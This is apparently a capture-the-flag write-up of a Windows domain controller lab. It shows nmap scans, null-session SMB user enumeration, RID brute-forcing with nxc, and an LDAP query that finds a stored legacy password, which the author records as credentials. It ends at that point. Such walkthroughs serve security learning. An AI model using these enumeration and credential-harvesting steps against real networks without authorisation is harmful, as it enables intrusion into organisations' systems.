# Host file setup
```python
sudo nxc smb 10.129.18.9 --generate-hosts-file /etc/hosts  
[sudo] password for kali: 
SMB         10.129.18.9     445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:None) (Null Auth:True)
```
- SMB signing is enabled
- Null auth enabled

# Enumeration
## Open ports
```python
nmap -p- --min-rate=2000 -sT -Pn casc-dc1.cascade.local
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-12 17:11 +0100
Nmap scan report for casc-dc1.cascade.local (10.129.18.9)
Host is up (0.013s latency).
rDNS record for 10.129.18.9: CASC-DC1.cascade.local
Not shown: 65520 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
49154/tcp open  unknown
49155/tcp open  unknown
49157/tcp open  unknown
49158/tcp open  unknown
49168/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 66.70 seconds
```

## Nmap
```python
nmap -p 53,88,135,139,389,445,636,3268,3269,5985 -A --min-rate=2000 -sT -Pn casc-dc1.cascade.local                      
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-12 17:13 +0100
Nmap scan report for casc-dc1.cascade.local (10.129.18.9)
Host is up (0.014s latency).
rDNS record for 10.129.18.9: CASC-DC1.cascade.local

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-04-12 16:13:53Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone|specialized
Running (JUST GUESSING): Microsoft Windows 2008|7|Vista|Phone|2012|8.1 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_vista cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_8.1
Aggressive OS guesses: Microsoft Windows 7 or Windows Server 2008 R2 (97%), Microsoft Windows Server 2008 R2 or Windows 7 SP1 (92%), Microsoft Windows Vista or Windows 7 (92%), Microsoft Windows 8.1 Update 1 (92%), Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows Embedded Standard 7 (91%), Microsoft Windows Server 2008 R2 (89%), Microsoft Windows Server 2008 R2 or Windows 8.1 (89%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
```

# SMB (445)
## Null auth
### Users
```python
nxc smb casc-dc1.cascade.local -u '' -p '' --users-export users.txt
SMB         10.129.18.9     445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.18.9     445    CASC-DC1         [+] cascade.local\: 
SMB         10.129.18.9     445    CASC-DC1         -Username-                    -Last PW Set-       -BadPW- -Description-                                               
SMB         10.129.18.9     445    CASC-DC1         CascGuest                     <never>             0       Built-in account for guest access to the computer/domain 
SMB         10.129.18.9     445    CASC-DC1         arksvc                        2020-01-09 16:18:20 0        
SMB         10.129.18.9     445    CASC-DC1         s.smith                       2020-01-28 19:58:05 0        
SMB         10.129.18.9     445    CASC-DC1         r.thompson                    2020-01-09 19:31:26 0        
SMB         10.129.18.9     445    CASC-DC1         util                          2020-01-13 02:07:11 0        
SMB         10.129.18.9     445    CASC-DC1         j.wakefield                   2020-01-09 20:34:44 0        
SMB         10.129.18.9     445    CASC-DC1         s.hickson                     2020-01-13 01:24:27 0        
SMB         10.129.18.9     445    CASC-DC1         j.goodhand                    2020-01-13 01:40:26 0        
SMB         10.129.18.9     445    CASC-DC1         a.turnbull                    2020-01-13 01:43:13 0        
SMB         10.129.18.9     445    CASC-DC1         e.crowe                       2020-01-13 03:45:02 0        
SMB         10.129.18.9     445    CASC-DC1         b.hanson                      2020-01-13 16:35:39 0        
SMB         10.129.18.9     445    CASC-DC1         d.burman                      2020-01-13 16:36:12 0        
SMB         10.129.18.9     445    CASC-DC1         BackupSvc                     2020-01-13 16:37:03 0        
SMB         10.129.18.9     445    CASC-DC1         j.allen                       2020-01-13 17:23:59 0        
SMB         10.129.18.9     445    CASC-DC1         i.croft                       2020-01-15 21:46:21 0        
SMB         10.129.18.9     445    CASC-DC1         [*] Enumerated 15 local users: CASCADE
SMB         10.129.18.9     445    CASC-DC1         [*] Writing 15 local users to users.txt
```

### Shares
Cannot list shares using null authentication

### Rid brute
```python
nxc smb casc-dc1.cascade.local -u '' -p '' --rid-brute 20000 | grep '(SidTypeUser)' | cut -d '\' -f 2 | cut -d ' ' -f 1 > users.txt
```
Since rid brute tends to be more accurate i will run this as well and cut the output and replace the contents of the user file

This has given me three extra users!

The guest account is called `CascGuest` on this domain but this account is disabled so no help here

# LDAP (389)
```python
nxc ldap casc-dc1.cascade.local -u '' -p '' --query "(sAMAccountName=r.thompson)" ""   

LDAP        10.129.18.9     389    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 (name:CASC-DC1) (domain:cascade.local) (signing:None) (channel binding:No TLS cert) 
LDAP        10.129.18.9     389    CASC-DC1         [+] cascade.local\: 
LDAP        10.129.18.9     389    CASC-DC1         [+] Response for object: CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local
LDAP        10.129.18.9     389    CASC-DC1         objectClass          top
LDAP        10.129.18.9     389    CASC-DC1                              person
LDAP        10.129.18.9     389    CASC-DC1                              organizationalPerson
LDAP        10.129.18.9     389    CASC-DC1                              user
LDAP        10.129.18.9     389    CASC-DC1         cn                   Ryan Thompson
LDAP        10.129.18.9     389    CASC-DC1         sn                   Thompson
LDAP        10.129.18.9     389    CASC-DC1         givenName            Ryan
LDAP        10.129.18.9     389    CASC-DC1         distinguishedName    CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local
LDAP        10.129.18.9     389    CASC-DC1         instanceType         4
LDAP        10.129.18.9     389    CASC-DC1         whenCreated          20200109193126.0Z
LDAP        10.129.18.9     389    CASC-DC1         whenChanged          20200323112031.0Z
LDAP        10.129.18.9     389    CASC-DC1         displayName          Ryan Thompson
LDAP        10.129.18.9     389    CASC-DC1         uSNCreated           24610
LDAP        10.129.18.9     389    CASC-DC1         memberOf             CN=IT,OU=Groups,OU=UK,DC=cascade,DC=local
LDAP        10.129.18.9     389    CASC-DC1         uSNChanged           295010
LDAP        10.129.18.9     389    CASC-DC1         name                 Ryan Thompson
LDAP        10.129.18.9     389    CASC-DC1         objectGUID           2dfa43ea-a9e0-524b-a913-2f5b1570418c
LDAP        10.129.18.9     389    CASC-DC1         userAccountControl   66048
LDAP        10.129.18.9     389    CASC-DC1         badPwdCount          36
LDAP        10.129.18.9     389    CASC-DC1         codePage             0
LDAP        10.129.18.9     389    CASC-DC1         countryCode          0
LDAP        10.129.18.9     389    CASC-DC1         badPasswordTime      134204850389451552
LDAP        10.129.18.9     389    CASC-DC1         lastLogoff           0
LDAP        10.129.18.9     389    CASC-DC1         lastLogon            132247339125713230
LDAP        10.129.18.9     389    CASC-DC1         pwdLastSet           132230718862636251
LDAP        10.129.18.9     389    CASC-DC1         primaryGroupID       513
LDAP        10.129.18.9     389    CASC-DC1         objectSid            S-1-5-21-3332504370-1206983947-1165150453-1109
LDAP        10.129.18.9     389    CASC-DC1         accountExpires       9223372036854775807
LDAP        10.129.18.9     389    CASC-DC1         logonCount           2
LDAP        10.129.18.9     389    CASC-DC1         sAMAccountName       r.thompson
LDAP        10.129.18.9     389    CASC-DC1         sAMAccountType       805306368
LDAP        10.129.18.9     389    CASC-DC1         userPrincipalName    r.thompson@cascade.local
LDAP        10.129.18.9     389    CASC-DC1         objectCategory       CN=Person,CN=Schema,CN=Configuration,DC=cascade,DC=local
LDAP        10.129.18.9     389    CASC-DC1         dSCorePropagationData 20200126183918.0Z
LDAP        10.129.18.9     389    CASC-DC1                              20200119174753.0Z
LDAP        10.129.18.9     389    CASC-DC1                              20200119174719.0Z
LDAP        10.129.18.9     389    CASC-DC1                              20200119174508.0Z
LDAP        10.129.18.9     389    CASC-DC1                              16010101000000.0Z
LDAP        10.129.18.9     389    CASC-DC1         lastLogonTimestamp   132294360317419816
LDAP        10.129.18.9     389    CASC-DC1         msDS-SupportedEncryptionTypes 0
LDAP        10.129.18.9     389    CASC-DC1         cascadeLegacyPwd     clk0bjVldmE=
```
After querying several different users on the domain i try this one and find credentials

```python
r.thompson:clk0bjVldmE=
```

```python

```